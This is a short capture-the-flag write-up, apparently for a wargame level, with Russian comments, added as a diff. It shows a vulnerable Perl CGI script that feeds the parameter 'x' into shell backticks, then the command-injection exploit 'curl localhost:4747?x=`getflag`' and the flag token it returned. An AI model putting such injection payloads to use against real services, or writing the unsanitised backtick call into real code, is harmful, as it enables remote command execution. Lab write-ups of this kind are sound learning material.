@@ -1,0 +1,19 @@
+1) cat level04.pl 
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+Видим что поднят сервер на 4747 порту, который может принимать аргумент x
+
+2) print `echo $y 2>&1`;
+Строка в ` ` говорит о том, что запуститься новый процесс оболочки, в котором выполняется указанная команда
+Пробуем в x передать параметр, учитывая данный факт
+
+3) curl localhost:4747?x=\`getflag\`
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
